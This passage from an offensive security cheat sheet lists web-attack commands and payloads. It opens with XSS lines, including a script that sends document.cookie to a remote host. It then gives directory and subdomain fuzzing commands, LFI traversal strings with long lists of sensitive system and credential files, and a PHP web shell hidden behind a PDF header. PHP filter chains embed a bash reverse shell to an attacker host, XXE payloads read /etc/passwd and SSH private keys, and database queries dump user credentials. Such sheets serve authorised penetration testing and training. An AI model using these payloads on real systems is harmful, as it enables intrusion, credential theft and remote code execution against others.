&lt;script&gt;fetch('https://&lt;RHOST&gt;/steal?cookie=' + btoa(document.cookie));&lt;/script&gt;
&lt;script&gt;user.changeEmail('user@domain');&lt;/script&gt;
&lt;iframe src=file:///etc/passwd height=1000px width=1000px&gt;&lt;/iframe&gt;
&lt;img src='http://&lt;RHOST&gt;'/&gt;
</code></pre>
<h4>ffuf</h4>
<pre><code class="language-c">ffuf -w /usr/share/wordlists/dirb/common.txt -u http://&lt;RHOST&gt;/FUZZ --fs &lt;NUMBER&gt; -mc all
ffuf -w /usr/share/wordlists/dirb/common.txt -u http://&lt;RHOST&gt;/FUZZ --fw &lt;NUMBER&gt; -mc all
ffuf -w /usr/share/wordlists/dirb/common.txt -u http://&lt;RHOST&gt;/FUZZ -mc 200,204,301,302,307,401 -o results.txt
ffuf -c -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt -u http://&lt;RHOST&gt;/ -H &quot;Host: FUZZ.&lt;RHOST&gt;&quot; -fs 185
ffuf -c -w /usr/share/wordlists/seclists/Fuzzing/4-digits-0000-9999.txt -u http://&lt;RHOST&gt;/backups/backup_2020070416FUZZ.zip
</code></pre>
<h5>API Fuzzing</h5>
<pre><code class="language-c">ffuf -u https://&lt;RHOST&gt;/api/v2/FUZZ -w api_seen_in_wild.txt -c -ac -t 250 -fc 400,404,412
</code></pre>
<h5>Searching for LFI</h5>
<pre><code class="language-c">ffuf -w /usr/share/wordlists/seclists/Fuzzing/LFI/LFI-Jhaddix.txt -u http://&lt;RHOST&gt;/admin../admin_staging/index.php?page=FUZZ -fs 15349
</code></pre>
<h5>Fuzzing with PHP Session ID</h5>
<pre><code class="language-c">ffuf -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-lowercase-2.3-small.txt  -u &quot;http://&lt;RHOST&gt;/admin/FUZZ.php&quot; -b &quot;PHPSESSID=a0mjo6ukbkq271nb2rkb1joamp&quot; -fw 2644
</code></pre>
<h5>Recursion</h5>
<pre><code class="language-c">ffuf -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-small.txt -u http://&lt;RHOST&gt;/cd/basic/FUZZ -recursion
</code></pre>
<h5>File Extensions</h5>
<pre><code class="language-c">ffuf -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-small.txt -u http://&lt;RHOST&gt;/cd/ext/logs/FUZZ -e .log
</code></pre>
<h5>Rate Limiting</h5>
<pre><code class="language-c">ffuf -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-small.txt -t 5 -p 0.1 -u http://&lt;RHOST&gt;/cd/rate/FUZZ -mc 200,429
</code></pre>
<h5>Virtual Host Discovery</h5>
<pre><code class="language-c">ffuf -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-5000.txt -H &quot;Host: FUZZ.&lt;RHOST&gt;&quot; -u http://&lt;RHOST&gt; -fs 1495
</code></pre>
<h5>Massive File Extension Discovery</h5>
<pre><code class="language-c">ffuf -w /opt/seclists/Discovery/Web-Content/directory-list-1.0.txt -u http://&lt;RHOST&gt;/FUZZ -t 30 -c -H 'User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0' -mc 200,204,301,302,307,401,403,500 -ic -e .7z,.action,.ashx,.asp,.aspx,.backup,.bak,.bz,.c,.cgi,.conf,.config,.dat,.db,.dhtml,.do,.doc,.docm,.docx,.dot,.dotm,.go,.htm,.html,.ini,.jar,.java,.js,.js.map,.json,.jsp,.jsp.source,.jspx,.jsx,.log,.old,.pdb,.pdf,.phtm,.phtml,.pl,.py,.pyc,.pyz,.rar,.rhtml,.shtm,.shtml,.sql,.sqlite3,.svc,.tar,.tar.bz2,.tar.gz,.tsx,.txt,.wsdl,.xhtm,.xhtml,.xls,.xlsm,.xlst,.xlsx,.xltm,.xml,.zip
</code></pre>
<h4>GitTools</h4>
<pre><code class="language-c">./gitdumper.sh http://&lt;RHOST&gt;/.git/ /PATH/TO/FOLDER
./extractor.sh /PATH/TO/FOLDER/ /PATH/TO/FOLDER/
</code></pre>
<h4>Gobuster</h4>
<pre><code class="language-c">-e    // extended mode that renders the full url
-k    // skip ssl certificate validation
-r    // follow cedirects
-s    // status codes
-b    // exclude status codes
-k            // ignore certificates
--wildcard    // set wildcard option

$ gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u http://&lt;RHOST&gt;/
$ gobuster dir -w /usr/share/seclists/Discovery/Web-Content/big.txt -u http://&lt;RHOST&gt;/ -x php
$ gobuster dir -w /usr/share/wordlists/dirb/big.txt -u http://&lt;RHOST&gt;/ -x php,txt,html,js -e -s 200
$ gobuster dir -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-lowercase-2.3-medium.txt -u https://&lt;RHOST&gt;:&lt;RPORT&gt;/ -b 200 -k --wildcard
</code></pre>
<h5>Common File Extensions</h5>
<pre><code class="language-c">txt,bak,php,html,js,asp,aspx
</code></pre>
<h5>Common Picture Extensions</h5>
<pre><code class="language-c">png,jpg,jpeg,gif,bmp
</code></pre>
<h5>POST Requests</h5>
<pre><code class="language-c">gobuster dir -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-lowercase-2.3-medium.txt -u http://&lt;RHOST&gt;/api/ -e -s 200
</code></pre>
<h5>DNS Recon</h5>
<pre><code class="language-c">gobuster dns -d &lt;RHOST&gt; -w /usr/share/wordlists/SecLists/Discovery/DNS/subdomains-top1million-5000.txt
gobuster dns -d &lt;RHOST&gt; -t 50 -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-110000.txt
</code></pre>
<h5>VHost Discovery</h5>
<pre><code class="language-c">gobuster vhost -u &lt;RHOST&gt; -t 50 -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-110000.txt
gobuster vhost -u &lt;RHOST&gt; -t 50 -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-110000.txt --append-domain
</code></pre>
<h5>Specifiy User Agent</h5>
<pre><code class="language-c">gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u http://&lt;RHOST&gt;/ -a Linux
</code></pre>
<h4>Local File Inclusion (LFI)</h4>
<pre><code class="language-c">http://&lt;RHOST&gt;/&lt;FILE&gt;.php?file=
http://&lt;RHOST&gt;/&lt;FILE&gt;.php?file=../../../../../../../../etc/passwd
http://&lt;RHOST&gt;/&lt;FILE&gt;/php?file=../../../../../../../../../../etc/passwd
</code></pre>
<h5>Until php 5.3</h5>
<pre><code class="language-c">http://&lt;RHOST&gt;/&lt;FILE&gt;/php?file=../../../../../../../../../../etc/passwd%00
</code></pre>
<h5>Null Byte</h5>
<pre><code class="language-c">%00
0x00
</code></pre>
<h5>Encoded Traversal Strings</h5>
<pre><code class="language-c">../
..\
..\/
%2e%2e%2f
%252e%252e%252f
%c0%ae%c0%ae%c0%af
%uff0e%uff0e%u2215
%uff0e%uff0e%u2216
..././
...\.\
</code></pre>
<h5>php://filter Wrapper</h5>
<blockquote>
<p>https://medium.com/@nyomanpradipta120/local-file-inclusion-vulnerability-cfd9e62d12cb</p>
</blockquote>
<blockquote>
<p>https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/File%20Inclusion</p>
</blockquote>
<blockquote>
<p>https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/File%20Inclusion#wrapper-phpfilter</p>
</blockquote>
<pre><code class="language-c">url=php://filter/convert.base64-encode/resource=file:////var/www/&lt;RHOST&gt;/api.php
</code></pre>
<pre><code class="language-c">http://&lt;RHOST&gt;/index.php?page=php://filter/convert.base64-encode/resource=index
http://&lt;RHOST&gt;/index.php?page=php://filter/convert.base64-encode/resource=/etc/passwd
base64 -d &lt;FILE&gt;.php
</code></pre>
<h5>Django, Rails, or Node.js Web Application Header Values</h5>
<pre><code class="language-c">Accept: ../../../../.././../../../../etc/passwd{{
Accept: ../../../../.././../../../../etc/passwd{%0D
Accept: ../../../../.././../../../../etc/passwd{%0A
Accept: ../../../../.././../../../../etc/passwd{%00
Accept: ../../../../.././../../../../etc/passwd{%0D{{
Accept: ../../../../.././../../../../etc/passwd{%0A{{
Accept: ../../../../.././../../../../etc/passwd{%00{{
</code></pre>
<h5>Linux Files</h5>
<pre><code class="language-c">/etc/passwd
/etc/shadow
/etc/aliases
/etc/anacrontab
/etc/apache2/apache2.conf
/etc/apache2/httpd.conf
/etc/apache2/sites-enabled/000-default.conf
/etc/at.allow
/etc/at.deny
/etc/bashrc
/etc/bootptab
/etc/chrootUsers
/etc/chttp.conf
/etc/cron.allow
/etc/cron.deny
/etc/crontab
/etc/cups/cupsd.conf
/etc/exports
/etc/fstab
/etc/ftpaccess
/etc/ftpchroot
/etc/ftphosts
/etc/groups
/etc/grub.conf
/etc/hosts
/etc/hosts.allow
/etc/hosts.deny
/etc/httpd/access.conf
/etc/httpd/conf/httpd.conf
/etc/httpd/httpd.conf
/etc/httpd/logs/access_log
/etc/httpd/logs/access.log
/etc/httpd/logs/error_log
/etc/httpd/logs/error.log
/etc/httpd/php.ini
/etc/httpd/srm.conf
/etc/inetd.conf
/etc/inittab
/etc/issue
/etc/knockd.conf
/etc/lighttpd.conf
/etc/lilo.conf
/etc/logrotate.d/ftp
/etc/logrotate.d/proftpd
/etc/logrotate.d/vsftpd.log
/etc/lsb-release
/etc/motd
/etc/modules.conf
/etc/motd
/etc/mtab
/etc/my.cnf
/etc/my.conf
/etc/mysql/my.cnf
/etc/network/interfaces
/etc/networks
/etc/npasswd
/etc/passwd
/etc/php4.4/fcgi/php.ini
/etc/php4/apache2/php.ini
/etc/php4/apache/php.ini
/etc/php4/cgi/php.ini
/etc/php4/apache2/php.ini
/etc/php5/apache2/php.ini
/etc/php5/apache/php.ini
/etc/php/apache2/php.ini
/etc/php/apache/php.ini
/etc/php/cgi/php.ini
/etc/php.ini
/etc/php/php4/php.ini
/etc/php/php.ini
/etc/printcap
/etc/profile
/etc/proftp.conf
/etc/proftpd/proftpd.conf
/etc/pure-ftpd.conf
/etc/pureftpd.passwd
/etc/pureftpd.pdb
/etc/pure-ftpd/pure-ftpd.conf
/etc/pure-ftpd/pure-ftpd.pdb
/etc/pure-ftpd/putreftpd.pdb
/etc/redhat-release
/etc/resolv.conf
/etc/samba/smb.conf
/etc/snmpd.conf
/etc/ssh/ssh_config
/etc/ssh/sshd_config
/etc/ssh/ssh_host_dsa_key
/etc/ssh/ssh_host_dsa_key.pub
/etc/ssh/ssh_host_key
/etc/ssh/ssh_host_key.pub
/etc/sysconfig/network
/etc/syslog.conf
/etc/termcap
/etc/vhcs2/proftpd/proftpd.conf
/etc/vsftpd.chroot_list
/etc/vsftpd.conf
/etc/vsftpd/vsftpd.conf
/etc/wu-ftpd/ftpaccess
/etc/wu-ftpd/ftphosts
/etc/wu-ftpd/ftpusers
/logs/pure-ftpd.log
/logs/security_debug_log
/logs/security_log
/opt/lampp/etc/httpd.conf
/opt/xampp/etc/php.ini
/proc/cmdline
/proc/cpuinfo
/proc/filesystems
/proc/interrupts
/proc/ioports
/proc/meminfo
/proc/modules
/proc/mounts
/proc/net/arp
/proc/net/tcp
/proc/net/udp
/proc/&lt;PID&gt;/cmdline
/proc/&lt;PID&gt;/maps
/proc/sched_debug
/proc/self/cwd/app.py
/proc/self/environ
/proc/self/net/arp
/proc/stat
/proc/swaps
/proc/version
/root/anaconda-ks.cfg
/usr/etc/pure-ftpd.conf
/usr/lib/php.ini
/usr/lib/php/php.ini
/usr/local/apache/conf/modsec.conf
/usr/local/apache/conf/php.ini
/usr/local/apache/log
/usr/local/apache/logs
/usr/local/apache/logs/access_log
/usr/local/apache/logs/access.log
/usr/local/apache/audit_log
/usr/local/apache/error_log
/usr/local/apache/error.log
/usr/local/cpanel/logs
/usr/local/cpanel/logs/access_log
/usr/local/cpanel/logs/error_log
/usr/local/cpanel/logs/license_log
/usr/local/cpanel/logs/login_log
/usr/local/cpanel/logs/stats_log
/usr/local/etc/httpd/logs/access_log
/usr/local/etc/httpd/logs/error_log
/usr/local/etc/php.ini
/usr/local/etc/pure-ftpd.conf
/usr/local/etc/pureftpd.pdb
/usr/local/lib/php.ini
/usr/local/php4/httpd.conf
/usr/local/php4/httpd.conf.php
/usr/local/php4/lib/php.ini
/usr/local/php5/httpd.conf
/usr/local/php5/httpd.conf.php
/usr/local/php5/lib/php.ini
/usr/local/php/httpd.conf
/usr/local/php/httpd.conf.ini
/usr/local/php/lib/php.ini
/usr/local/pureftpd/etc/pure-ftpd.conf
/usr/local/pureftpd/etc/pureftpd.pdn
/usr/local/pureftpd/sbin/pure-config.pl
/usr/local/www/logs/httpd_log
/usr/local/Zend/etc/php.ini
/usr/sbin/pure-config.pl
/var/adm/log/xferlog
/var/apache2/config.inc
/var/apache/logs/access_log
/var/apache/logs/error_log
/var/cpanel/cpanel.config
/var/lib/mysql/my.cnf
/var/lib/mysql/mysql/user.MYD
/var/local/www/conf/php.ini
/var/log/apache2/access_log
/var/log/apache2/access.log
/var/log/apache2/error_log
/var/log/apache2/error.log
/var/log/apache/access_log
/var/log/apache/access.log
/var/log/apache/error_log
/var/log/apache/error.log
/var/log/apache-ssl/access.log
/var/log/apache-ssl/error.log
/var/log/auth.log
/var/log/boot
/var/htmp
/var/log/chttp.log
/var/log/cups/error.log
/var/log/daemon.log
/var/log/debug
/var/log/dmesg
/var/log/dpkg.log
/var/log/exim_mainlog
/var/log/exim/mainlog
/var/log/exim_paniclog
/var/log/exim.paniclog
/var/log/exim_rejectlog
/var/log/exim/rejectlog
/var/log/faillog
/var/log/ftplog
/var/log/ftp-proxy
/var/log/ftp-proxy/ftp-proxy.log
/var/log/httpd-access.log
/var/log/httpd/access_log
/var/log/httpd/access.log
/var/log/httpd/error_log
/var/log/httpd/error.log
/var/log/httpsd/ssl.access_log
/var/log/httpsd/ssl_log
/var/log/kern.log
/var/log/lastlog
/var/log/lighttpd/access.log
/var/log/lighttpd/error.log
/var/log/lighttpd/lighttpd.access.log
/var/log/lighttpd/lighttpd.error.log
/var/log/mail.info
/var/log/mail.log
/var/log/maillog
/var/log/mail.warn
/var/log/message
/var/log/messages
/var/log/mysqlderror.log
/var/log/mysql.log
/var/log/mysql/mysql-bin.log
/var/log/mysql/mysql.log
/var/log/mysql/mysql-slow.log
/var/log/proftpd
/var/log/pureftpd.log
/var/log/pure-ftpd/pure-ftpd.log
/var/log/secure
/var/log/vsftpd.log
/var/log/wtmp
/var/log/xferlog
/var/log/yum.log
/var/mysql.log
/var/run/utmp
/var/spool/cron/crontabs/root
/var/webmin/miniserv.log
/var/www/html&lt;VHOST&gt;/__init__.py
/var/www/html/db_connect.php
/var/www/html/utils.php
/var/www/log/access_log
/var/www/log/error_log
/var/www/logs/access_log
/var/www/logs/error_log
/var/www/logs/access.log
/var/www/logs/error.log
~/.atfp_history
~/.bash_history
~/.bash_logout
~/.bash_profile
~/.bashrc
~/.gtkrc
~/.login
~/.logout
~/.mysql_history
~/.nano_history
~/.php_history
~/.profile
~/.ssh/authorized_keys
~/.ssh/id_dsa
~/.ssh/id_dsa.pub
~/.ssh/id_rsa
~/.ssh/id_rsa.pub
~/.ssh/identity
~/.ssh/identity.pub
~/.viminfo
~/.wm_style
~/.Xdefaults
~/.xinitrc
~/.Xresources
~/.xsession
</code></pre>
<h5>Windows Files</h5>
<pre><code class="language-c">C:/Users/Administrator/NTUser.dat
C:/Documents and Settings/Administrator/NTUser.dat
C:/apache/logs/access.log
C:/apache/logs/error.log
C:/apache/php/php.ini
C:/boot.ini
C:/inetpub/wwwroot/global.asa
C:/MySQL/data/hostname.err
C:/MySQL/data/mysql.err
C:/MySQL/data/mysql.log
C:/MySQL/my.cnf
C:/MySQL/my.ini
C:/php4/php.ini
C:/php5/php.ini
C:/php/php.ini
C:/Program Files/Apache Group/Apache2/conf/httpd.conf
C:/Program Files/Apache Group/Apache/conf/httpd.conf
C:/Program Files/Apache Group/Apache/logs/access.log
C:/Program Files/Apache Group/Apache/logs/error.log
C:/Program Files/FileZilla Server/FileZilla Server.xml
C:/Program Files/MySQL/data/hostname.err
C:/Program Files/MySQL/data/mysql-bin.log
C:/Program Files/MySQL/data/mysql.err
C:/Program Files/MySQL/data/mysql.log
C:/Program Files/MySQL/my.ini
C:/Program Files/MySQL/my.cnf
C:/Program Files/MySQL/MySQL Server 5.0/data/hostname.err
C:/Program Files/MySQL/MySQL Server 5.0/data/mysql-bin.log
C:/Program Files/MySQL/MySQL Server 5.0/data/mysql.err
C:/Program Files/MySQL/MySQL Server 5.0/data/mysql.log
C:/Program Files/MySQL/MySQL Server 5.0/my.cnf
C:/Program Files/MySQL/MySQL Server 5.0/my.ini
C:/Program Files (x86)/Apache Group/Apache2/conf/httpd.conf
C:/Program Files (x86)/Apache Group/Apache/conf/httpd.conf
C:/Program Files (x86)/Apache Group/Apache/conf/access.log
C:/Program Files (x86)/Apache Group/Apache/conf/error.log
C:/Program Files (x86)/FileZilla Server/FileZilla Server.xml
C:/Program Files (x86)/xampp/apache/conf/httpd.conf
C:/WINDOWS/php.ini
C:/WINDOWS/Repair/SAM
C:/Windows/repair/system
C:/Windows/repair/software
C:/Windows/repair/security
C:/WINDOWS/System32/drivers/etc/hosts
C:/Windows/win.ini
C:/WINNT/php.ini
C:/WINNT/win.ini
C:/xampp/apache/bin/php.ini
C:/xampp/apache/logs/access.log
C:/xampp/apache/logs/error.log
C:/Windows/Panther/Unattend/Unattended.xml
C:/Windows/Panther/Unattended.xml
C:/Windows/debug/NetSetup.log
C:/Windows/system32/config/AppEvent.Evt
C:/Windows/system32/config/SecEvent.Evt
C:/Windows/system32/config/default.sav
C:/Windows/system32/config/security.sav
C:/Windows/system32/config/software.sav
C:/Windows/system32/config/system.sav
C:/Windows/system32/config/regback/default
C:/Windows/system32/config/regback/sam
C:/Windows/system32/config/regback/security
C:/Windows/system32/config/regback/system
C:/Windows/system32/config/regback/software
C:/Program Files/MySQL/MySQL Server 5.1/my.ini
C:/Windows/System32/inetsrv/config/schema/ASPNET_schema.xml
C:/Windows/System32/inetsrv/config/applicationHost.config
C:/inetpub/logs/LogFiles/W3SVC1/u_ex[YYMMDD].log
</code></pre>
<h4>PDF PHP Inclusion</h4>
<p>Create a file with a PDF header, which contains PHP code.</p>
<pre><code class="language-c">%PDF-1.4

&lt;?php
    system($_GET[&quot;cmd&quot;]);
?&gt;
</code></pre>
<pre><code class="language-c">http://&lt;RHOST&gt;/index.php?page=uploads/&lt;FILE&gt;.pdf%00&amp;cmd=whoami
</code></pre>
<h4>PHP Upload Filter Bypasses</h4>
<pre><code class="language-c">.sh
.cgi
.inc
.txt
.pht
.phtml
.phP
.Php
.php3
.php4
.php5
.php7
.pht
.phps
.phar
.phpt
.pgif
.phtml
.phtm
.php%00.jpeg
</code></pre>
<pre><code class="language-c">&lt;FILE&gt;.php%20
&lt;FILE&gt;.php%0d%0a.jpg
&lt;FILE&gt;.php%0a
&lt;FILE&gt;.php.jpg
&lt;FILE&gt;.php%00.gif
&lt;FILE&gt;.php\x00.gif
&lt;FILE&gt;.php%00.png
&lt;FILE&gt;.php\x00.png
&lt;FILE&gt;.php%00.jpg
&lt;FILE&gt;.php\x00.jpg
mv &lt;FILE&gt;.jpg &lt;FILE&gt;.php\x00.jpg
</code></pre>
<h4>PHP Filter Chain Generator</h4>
<blockquote>
<p>https://github.com/synacktiv/php_filter_chain_generator</p>
</blockquote>
<pre><code class="language-c">python3 php_filter_chain_generator.py --chain '&lt;?= exec($_GET[0]); ?&gt;'
python3 php_filter_chain_generator.py --chain &quot;&lt;?php echo shell_exec(id); ?&gt;&quot;
python3 php_filter_chain_generator.py --chain &quot;&quot;&quot;&lt;?php echo shell_exec(id); ?&gt;&quot;&quot;&quot;
python3 php_filter_chain_generator.py --chain &quot;&quot;&quot;&quot;&lt;?php exec(&quot;&quot;/bin/bash -c 'bash -i &gt;&amp; /dev/tcp/&lt;LHOST&gt;/&lt;LPORT&gt; 0&gt;&amp;1'&quot;&quot;);?&gt;&quot;&quot;&quot;&quot;
python3 php_filter_chain_generator.py --chain &quot;&quot;&quot;&quot;&lt;?php exec(&quot;&quot;/bin/bash -c 'bash -i &gt;&amp; /dev/tcp/&lt;LHOST&gt;/&lt;LPORT&gt; 0&gt;&amp;1'&quot;&quot;);?&gt;&quot;&quot;&quot;&quot;
</code></pre>
<pre><code class="language-c">http://&lt;RHOST&gt;/?page=php://filter/convert.base64-decode/resource=PD9waHAgZWNobyBzaGVsbF9leGVjKGlkKTsgPz4
</code></pre>
<pre><code class="language-c">python3 php_filter_chain_generator.py --chain '&lt;?= exec($_GET[0]); ?&gt;'
[+] The following gadget chain will generate the following code : &lt;?= exec($_GET[0]); ?&gt; (base64 value: PD89IGV4ZWMoJF9HRVRbMF0pOyA/Pg)
php://filter/convert.iconv.UTF8.CSISO2022KR|convert.base64-encode|&lt;--- SNIP ---&gt;|convert.iconv.UTF8.UTF7|convert.base64-decode/resource=php://temp&amp;0=&lt;COMMAND&gt;
</code></pre>
<h4>PHP Generic Gadget Chains (PHPGGC)</h4>
<pre><code class="language-c">phpggc -u --fast-destruct Guzzle/FW1 /dev/shm/&lt;FILE&gt;.txt /PATH/TO/FILE/&lt;FILE&gt;.txt
</code></pre>
<h4>Server-Side Request Forgery (SSRF)</h4>
<pre><code class="language-c">https://&lt;RHOST&gt;/item/2?server=server.&lt;RHOST&gt;/file?id=9&amp;x=
</code></pre>
<h4>Server-Side Template Injection (SSTI)</h4>
<h5>Fuzz String</h5>
<blockquote>
<p>https://cobalt.io/blog/a-pentesters-guide-to-server-side-template-injection-ssti</p>
</blockquote>
<p><code>${{&lt;%[%'&quot;}}%\.</code></p>
<h5>Magic Payload</h5>
<blockquote>
<p>https://medium.com/@nyomanpradipta120/ssti-in-flask-jinja2-20b068fdaeee</p>
</blockquote>
<p><code>{{ ‘’.__class__.__mro__[1].__subclasses__() }}</code></p>
<h4>Upload Vulnerabilities</h4>
<pre><code class="language-c">ASP / ASPX / PHP / PHP3 / PHP5: Webshell / Remote Code Execution
SVG: Stored XSS / Server-Side Request Forgery
GIF: Stored XSS
CSV: CSV Injection
XML: XXE
AVI: Local File Inclusion / Server-Side request Forgery
HTML/JS: HTML Injection / XSS / Open Redirect
PNG / JPEG: Pixel Flood Attack
ZIP: Remote Code Exection via Local File Inclusion
PDF / PPTX: Server-Side Request Forgery / Blind XXE
</code></pre>
<h4>wfuzz</h4>
<pre><code class="language-c">wfuzz -w /usr/share/wfuzz/wordlist/general/big.txt -u http://&lt;RHOST&gt;/FUZZ/&lt;FILE&gt;.php --hc '403,404'
</code></pre>
<h5>Write to File</h5>
<pre><code class="language-c">wfuzz -w /PATH/TO/WORDLIST -c -f &lt;FILE&gt; -u http://&lt;RHOST&gt; --hc 403,404
</code></pre>
<h5>Custom Scan with limited Output</h5>
<pre><code class="language-c">wfuzz -w /PATH/TO/WORDLIST -u http://&lt;RHOST&gt;/dev/304c0c90fbc6520610abbf378e2339d1/db/file_FUZZ.txt --sc 200 -t 20
</code></pre>
<h5>Fuzzing two Parameters at once</h5>
<pre><code class="language-c">wfuzz -w /usr/share/wordlists/seclists/Discovery/Web-Content/big.txt -u http://&lt;RHOST&gt;:/&lt;directory&gt;/FUZZ.FUZ2Z -z list,txt-php --hc 403,404 -c
</code></pre>
<h5>Domain</h5>
<pre><code class="language-c">wfuzz --hh 0 -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -H 'Host: FUZZ.&lt;RHOST&gt;' -u http://&lt;RHOST&gt;/
</code></pre>
<h5>Subdomain</h5>
<pre><code class="language-c">wfuzz -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-110000.txt -H &quot;Host: FUZZ.&lt;RHOST&gt;&quot; --hc 200 --hw 356 -t 100 &lt;RHOST&gt;
</code></pre>
<h5>Git</h5>
<pre><code class="language-c">wfuzz -w /usr/share/wordlists/seclists/Discovery/Web-Content/raft-medium-files-lowercase.txt -u http://&lt;RHOST&gt;/FUZZ --hc 403,404
</code></pre>
<h5>Login</h5>
<pre><code class="language-c">wfuzz -X POST -u &quot;http://&lt;RHOST&gt;:&lt;RPORT&gt;/login.php&quot; -d &quot;email=FUZZ&amp;password=&lt;PASSWORD&gt;&quot; -w /PATH/TO/WORDLIST/&lt;WORDLIST&gt;.txt --hc 200 -c
wfuzz -X POST -u &quot;http://&lt;RHOST&gt;:&lt;RPORT&gt;/login.php&quot; -d &quot;username=FUZZ&amp;password=&lt;PASSWORD&gt;&quot; -w /PATH/TO/WORDLIST/&lt;WORDLIST&gt;.txt --ss &quot;Invalid login&quot;
</code></pre>
<h5>SQL</h5>
<pre><code class="language-c">wfuzz -c -z file,/usr/share/wordlists/seclists/Fuzzing/SQLi/Generic-SQLi.txt -d 'db=FUZZ' --hl 16 http://&lt;RHOST&gt;/select http
</code></pre>
<h5>DNS</h5>
<pre><code class="language-c">wfuzz -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt -H &quot;Origin: http://FUZZ.&lt;RHOST&gt;&quot; --filter &quot;r.headers.response~'Access-Control-Allow-Origin'&quot; http://&lt;RHOST&gt;/
wfuzz -c -w /usr/share/wordlists/secLists/Discovery/DNS/subdomains-top1million-110000.txt --hc 400,404,403 -H &quot;Host: FUZZ.&lt;RHOST&gt;&quot; -u http://&lt;RHOST&gt; -t 100
wfuzz -c -w /usr/share/wordlists/secLists/Discovery/DNS/subdomains-top1million-110000.txt --hc 400,403,404 -H &quot;Host: FUZZ.&lt;RHOST&gt;&quot; -u http://&lt;RHOST&gt; --hw &lt;value&gt; -t 100
</code></pre>
<h5>Numbering Files</h5>
<pre><code class="language-c">wfuzz -w /usr/share/wordlists/seclists/Fuzzing/4-digits-0000-9999.txt --hw 31 http://10.13.37.11/backups/backup_2021052315FUZZ.zip
</code></pre>
<h5>Enumerating PIDs</h5>
<pre><code class="language-c">wfuzz -u 'http://backdoor.htb/wp-content/plugins/ebook-download/filedownload.php?ebookdownloadurl=/proc/FUZZ/cmdline' -z range,900-1000
</code></pre>
<h4>WPScan</h4>
<pre><code class="language-c">wpscan --url https://&lt;RHOST&gt; --enumerate u,t,p
wpscan --url https://&lt;RHOST&gt; --plugins-detection aggressive
wpscan --url https://&lt;RHOST&gt; --disable-tls-checks
wpscan --url https://&lt;RHOST&gt; --disable-tls-checks --enumerate u,t,p
wpscan --url http://&lt;RHOST&gt; -U &lt;USERNAME&gt; -P passwords.txt -t 50
</code></pre>
<h4>XML External Entity (XXE)</h4>
<h5>Skeleton Payload Request</h5>
<pre><code class="language-c">GET / HTTP/1.1
Host: &lt;RHOST&gt;:&lt;RPORT&gt;
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Length: 136

&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot; ?&gt;
&lt;!DOCTYPE test [&lt;!ENTITY xxe SYSTEM &quot;http://&lt;LHOST&gt;:80/shell.php&quot; &gt;]&gt;
&lt;foo&gt;&amp;xxe;&lt;/foo&gt;
</code></pre>
<h5>Payloads</h5>
<pre><code class="language-c">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;&lt;!DOCTYPE xxe [ &lt;!ENTITY passwd SYSTEM 'file:///etc/passwd'&gt; ]&gt;
 &lt;stockCheck&gt;&lt;productId&gt;&amp;passwd;&lt;/productId&gt;&lt;storeId&gt;1&lt;/storeId&gt;&lt;/stockCheck&gt;
</code></pre>
<pre><code class="language-c">&lt;?xml version=&quot;1.0&quot;?&gt;&lt;!DOCTYPE root [&lt;!ENTITY test SYSTEM 'file:///c:/windows/win.ini'&gt;]&gt;&lt;order&gt;&lt;quantity&gt;3&lt;/quantity&gt;&lt;item&gt;&amp;test;&lt;/item&gt;&lt;address&gt;17th Estate, CA&lt;/address&gt;&lt;/order&gt;
</code></pre>
<pre><code class="language-c">username=%26username%3b&amp;version=1.0.0--&gt;&lt;!DOCTYPE+username+[+&lt;!ENTITY+username+SYSTEM+&quot;/root/.ssh/id_rsa&quot;&gt;+]&gt;&lt;!--
</code></pre>
<h3>Database Analysis</h3>
<h4>MongoDB</h4>
<pre><code class="language-c">mongo &quot;mongodb://localhost:27017&quot;
</code></pre>
<pre><code class="language-c">&gt; use &lt;DATABASE&gt;;
&gt; show tables;
&gt; show collections;
&gt; db.system.keys.find();
&gt; db.users.find();
&gt; db.getUsers();
&gt; db.getUsers({showCredentials: true});
&gt; db.accounts.find();
&gt; db.accounts.find().pretty();
&gt; use admin;
</code></pre>
<h5>User Password Reset to &quot;12345&quot;</h5>
<pre><code class="language-c">&gt; db.getCollection('users').update({username:&quot;admin&quot;}, { $set: {&quot;services&quot; : { &quot;password&quot; : {&quot;bcrypt&quot; : &quot;$2a$10$n9CM8OgInDlwpvjLKLPML.eizXIzLlRtgCh3GRLafOdR9ldAUh/KG&quot; } } } })
</code></pre>
<h4>MSSQL</h4>
<h5>Show Database Content</h5>
<pre><code class="language-c">1&gt; SELECT name FROM master.sys.databases
2&gt; go
</code></pre>
<h5>OPENQUERY</h5>
<pre><code class="language-c">1&gt; select * from openquery(&quot;web\clients&quot;, 'select name from master.sys.databases');
2&gt; go
</code></pre>
<pre><code class="language-c">1&gt; select * from openquery(&quot;web\clients&quot;, 'select name from clients.sys.objects');
2&gt; go
</code></pre>
<h5>Binary Extraction as Base64</h5>
<pre><code class="language-c">1&gt; select cast((select content from openquery([web\clients], 'select * from clients.sys.assembly_files') where assembly_id = 65536) as varbinary(max)) for xml path(''), binary base64;
2&gt; go &gt; export.txt
</code></pre>
